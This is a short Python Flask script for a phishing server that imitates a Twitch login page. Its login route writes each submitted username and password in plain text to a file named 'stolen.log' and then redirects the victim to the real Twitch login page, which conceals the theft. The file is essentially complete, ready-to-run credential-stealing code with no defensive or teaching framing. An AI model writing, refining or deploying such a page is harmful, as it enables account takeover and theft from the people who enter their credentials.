from flask import Flask, render_template, request, redirect, url_for
import os

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        # Save credentials
        with open('stolen.log', 'a') as f:
            f.write(f"USER: {username}\nPASS: {password}\n---\n")
        
        # Redirect to real Twitch
        return redirect("https://www.twitch.tv/login")
    
    return render_template('index.html')

if __name__ == '__main__':
    # Create required folders
    os.makedirs('static', exist_ok=True)
    os.makedirs('templates', exist_ok=True)
    
    # Create stolen.log if it doesn't exist
    if not os.path.exists('stolen.log'):
        open('stolen.log', 'w').close()
    
    app.run(host='0.0.0.0', port=5000, debug=True)